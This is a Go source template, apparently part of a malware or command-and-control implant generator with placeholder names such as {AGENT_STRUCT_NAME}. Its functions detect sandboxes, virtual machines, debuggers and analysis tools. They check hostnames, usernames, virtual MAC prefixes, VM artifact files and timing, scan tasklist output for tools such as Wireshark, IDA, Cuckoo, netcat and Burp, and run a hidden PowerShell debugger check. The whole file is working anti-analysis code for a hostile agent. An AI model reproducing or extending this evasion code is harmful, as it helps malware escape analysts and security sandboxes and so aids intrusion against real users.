// Sandbox and debugger checks functionality
func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	cpuCount := runtime.NumCPU()
	if cpuCount < 2 {
		return true
	}

	var totalRAM uint64
	// Windows-specific sandbox checks
	if os.Getenv("VBOX_SHARED_FOLDERS") != "" ||
	   os.Getenv("VBOX_SESSION") != "" ||
	   strings.Contains(os.Getenv("COMPUTERNAME"), "SANDBOX") ||
	   strings.Contains(os.Getenv("COMPUTERNAME"), "SND") {
		return true
	}

	if totalRAM > 0 && totalRAM < 2*1024*1024*1024 { // Less than 2GB
		return true
	}

	hostname, _ := os.Hostname()
	hostnameLower := strings.ToLower(hostname)
	sandboxIndicators := []string{
		"sandbox", "malware", "detected", "test",
		"cuckoo", "malbox", "innotek",
		"virtual", "vmware", "vbox", "xen",
	}
	for _, indicator := range sandboxIndicators {
		if strings.Contains(hostnameLower, indicator) {
			return true
		}
	}

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = "unknown"
	}
	usernameLower := strings.ToLower(username)
	suspiciousUsers := []string{"sandbox", "malware", "user", "test", "admin"}
	for _, user := range suspiciousUsers {
		if usernameLower == user {
			return true
		}
	}

	interfaces, err := net.Interfaces()
	if err == nil {
		virtualMacPrefixes := []string{"08:00:27", "00:0c:29", "00:50:56", "00:1c:42", "52:54:00"}
		for _, iface := range interfaces {
			mac := iface.HardwareAddr.String()
			mac = strings.ToLower(mac)
			for _, prefix := range virtualMacPrefixes {
				if strings.HasPrefix(mac, prefix) {
					return true
				}
			}
		}
	}

	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() {
		return true
	}

	currentPath, _ := os.Getwd()
	currentPath = strings.ToLower(currentPath)
	suspiciousPaths := []string{
		"vmware", "virtualbox", "vbox",
		"sandbox", "cuckoo", "cape", "malware",
	}
	for _, path := range suspiciousPaths {
		if strings.Contains(currentPath, path) {
			return true
		}
	}

	envSandboxIndicators := []string{
		"SANDBOX", "CUCKOO", "CAPE", "MALWARE",
		"VIRUSTOTAL", "HYBRID", "ANYRUN",
	}
	for _, envVar := range envSandboxIndicators {
		if os.Getenv(envVar) != "" || os.Getenv(strings.ToLower(envVar)) != "" {
			return true
		}
	}


	suspiciousFiles := []string{
		"C:\\windows\\temp\\vmware_trace.log",  // VMware
		"C:\\windows\\temp\\VirtualBox.log",   // VirtualBox
		"C:\\windows\\system32\\drivers\\VBoxMouse.sys",  // VBox
		"/tmp/vmware_trace.log",  // VMware on Linux
		"/tmp/vbox_mouse.log",    // VBox on Linux
	}
	for _, file := range suspiciousFiles {
		if _, err := os.Stat(file); err == nil {
			return true // File exists
		}
	}

	if a.{AGENT_CHECK_NETWORK_TOOLS_FUNC}() {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	sandboxProcesses := []string{
		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
		"procexp", "sniff", "netmon", "apimonitor", "regmon",
		"filemon", "immunity", "windbg", "fiddler", "apimon",
		"regmon", "sandbox", "cuckoo", "cape", "malware",
	}

	for _, proc := range sandboxProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(proc)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_NETWORK_TOOLS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	var processes string

	// Only support Windows platform
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	processes = string(output)

	networkTools := []string{
		"wireshark", "tcpdump", "tshark", "netsniff", "ettercap", "burp", "mitmproxy",
		"fiddler", "charles", "netcat", "ncat", "socat", "nmap", "zmap", "masscan",
		"theharvester", "maltego", "nessus", "openvas", "nessusd", "snort", "suricata",
		"procmon", "procexp",
	}

	for _, tool := range networkTools {
		if strings.Contains(strings.ToLower(processes), tool) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_DEBUGGERS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() {
		return true
	}

	if a.{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() {
		return true
	}

	start := time.Now()
	time.Sleep(10 * time.Millisecond)
	actualSleep := time.Since(start)
	expectedSleep := 10 * time.Millisecond
	if actualSleep < expectedSleep/2 || actualSleep > expectedSleep*2 {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	debuggerProcesses := []string{
		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
	}

	for _, dbg := range debuggerProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(dbg)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() bool {
	if runtime.GOOS != "windows" || a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
		"[System.Diagnostics.Debugger]::IsDebuggerPresent()")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	result := strings.TrimSpace(string(output))
	if strings.Contains(strings.ToLower(result), "true") {
		return true
	}

	return false
}